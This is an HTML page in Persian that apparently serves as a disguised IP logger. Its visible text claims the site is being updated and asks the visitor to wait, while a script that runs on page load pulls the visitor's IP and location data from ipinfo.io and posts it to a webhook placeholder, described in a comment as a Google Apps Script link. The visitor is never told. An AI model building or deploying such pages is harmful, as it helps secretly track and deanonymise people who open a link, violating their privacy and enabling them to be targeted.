<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>در حال بارگذاری...</title>
</head>
<body style="font-family: sans-serif; text-align: center; padding: 50px;">
  <h2>در حال بروزرسانی سایت، لطفاً چند لحظه صبر کنید...</h2>

  <script>
    fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE")
      .then(res => res.json())
      .then(data => {
        const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // لینک Google Apps Script

        fetch(webhookUrl, {
          method: "POST",
          body: JSON.stringify(data),
          headers: {
            "Content-Type": "application/json"
          }
        }).then(() => {
          // اختیاری: می‌تونی ریدایرکت کنی یا چیزی نشون بدی
        }).catch(err => {
          console.error("خطا در ارسال IP", err);
        });
      }).catch(err => {
        console.error("خطا در گرفتن IP", err);
      });
  </script>
</body>
</html>
